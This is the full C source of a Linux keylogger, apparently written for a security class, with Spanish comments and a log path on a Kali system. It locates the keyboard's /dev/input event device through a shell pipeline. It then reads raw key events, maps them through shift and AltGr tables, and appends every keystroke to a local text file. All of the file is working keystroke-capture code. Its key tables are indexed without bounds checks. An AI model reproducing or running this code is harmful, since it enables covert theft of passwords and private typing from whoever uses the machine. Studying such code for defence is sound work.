#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/kali/SeguridadInformatica/KeyLogger/keylogger.txt"

char *key_map[] = {
    "", "", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", "[BACKSPACE]", "[TAB]", "q", "w", "e", "r", "t", "y", "u", "i",
    "o", "p", "[", "]", "[ENTER]", "[CTRL]", "a", "s", "d", "f", "g", "h",
    "j", "k", "l", ";", "'", "", "[SHIFT]", "\\", "z", "x", "c", "v",
    "b", "n", "m", ",", ".", "/", "[SHIFT]", "*", "[ALT]", " ", "[CAPSLOCK]",
    "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]",
    "[F9]", "[F10]", "[NUMLOCK]", "[SCROLLLOCK]", "[HOME]", "[UP]",
    "[PGUP]", "-", "[LEFT]", "[RIGHT]", "+", "[END]", "[DOWN]",
    "[PGDN]", "[INS]", "[DEL]"
};

char *shift_map[] = {
    "", "", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")",
    "_", "+", "[BACKSPACE]", "[TAB]", "Q", "W", "E", "R", "T", "Y", "U", "I",
    "O", "P", "{", "}", "\n", "[CTRL]", "A", "S", "D", "F", "G", "H",
    "J", "K", "L", ":", "\"", "~", "[SHIFT]", "|", "Z", "X", "C", "V",
    "B", "N", "M", "<", ">", "?", "[SHIFT]", "*", "[ALT]", " ", "[CAPSLOCK]",
    "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]",
    "[F9]", "[F10]", "[NUMLOCK]", "[SCROLLLOCK]", "[HOME]", "[UP]",
    "[PGUP]", "-", "[LEFT]", "[RIGHT]", "+", "[END]", "[DOWN]",
    "[PGDN]", "[INS]", "[DEL]"
};

// Mapeo para AltGr en teclado de Estados Unidos - Internacional
char *altgr_map[] = {
    "", "", "", "", "", "", "", "", "", "", "", "",
    "¡", "²", "³", "¤", "€", "¼", "½", "¾", "‘", "’", "¥", "×",
    "ä", "å", "é", "®", "þ", "ü", "ú", "í", "ó", "ö", "«", "»",
    "¬", "", "", "á", "ß", "ð", "ø", "¶", "´", "æ", "©", "ñ", "µ", "ç", "¿"
};


char *getEvent();

int main(int argc, char const *argv[]) {
    struct input_event ev;
    static char path_keyboard[20] = "/dev/input/";
    int shift_pressed = 0;
    int capslock_active = 0;
    int altgr_pressed = 0;

    strcat(path_keyboard, getEvent());
    path_keyboard[strlen(path_keyboard) - 1] = 0;

    int device_keyboard = open(path_keyboard, O_RDONLY);

    if (device_keyboard < 0) {
        perror("Error abriendo el dispositivo de teclado");
        exit(1);
    }

    FILE *fp = fopen(LOGFILEPATH, "a");
    if (!fp) {
        perror("Error abriendo el archivo de log");
        close(device_keyboard);
        exit(1);
    }

    while (1) {
        read(device_keyboard, &ev, sizeof(ev));
        if (ev.type == EV_KEY) {
            if (ev.value == 1 || ev.value == 0) { // Tecla presionada o liberada
                switch (ev.code) {
                    case 42: // Shift izquierdo
                    case 54: // Shift derecho
                        shift_pressed = (ev.value == 1) ? 1 : 0;
                        break;
                    case 58: // Caps Lock
                        if (ev.value == 1) {
                            capslock_active = !capslock_active;
                        }
                        break;
                    case 100: // AltGr (Alt derecho)
                        altgr_pressed = (ev.value == 1) ? 1 : 0;
                        break;
                    default:
                        if (ev.value == 1) { // Solo registrar cuando se presiona (no cuando se libera)
                            if (altgr_pressed) {
                                fprintf(fp, "%s", altgr_map[ev.code]);
                            } else if (shift_pressed) {
                                fprintf(fp, "%s", shift_map[ev.code]);
                            } else if (capslock_active && ev.code >= 16 && ev.code <= 25) { // Letras A-Z
                                fprintf(fp, "%s", shift_map[ev.code]);
                            } else {
                                fprintf(fp, "%s", key_map[ev.code]);
                            }
                            fflush(fp);
                        }

                        break;
                }
            }
        }
    }

    fclose(fp);
    close(device_keyboard);
    return 0;
}

char *getEvent() {
    char *command = "cat /proc/bus/input/devices | grep -C 4 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");

    if (!pipe) {
        perror("Error abriendo pipe");
        exit(1);
    }

    fgets(event, 8, pipe);
    pclose(pipe);
    return event;
}